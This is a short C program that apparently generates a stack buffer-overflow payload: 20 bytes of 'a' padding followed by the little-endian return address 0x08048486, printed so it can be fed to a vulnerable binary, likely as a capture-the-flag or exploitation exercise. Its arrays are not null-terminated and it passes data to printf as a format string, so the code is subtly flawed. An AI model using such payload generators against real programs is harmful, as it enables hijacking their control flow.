int main()
{
	char pad[20];
	char address[4];

	//0x8048486
	memset(pad, 'a', 20);
	address[3] = 0x08;
	address[2] = 0x04;
	address[1] = 0x84;
	address[0] = 0x86;
	
	printf(pad);
	printf(address);
	
	return 0;
}

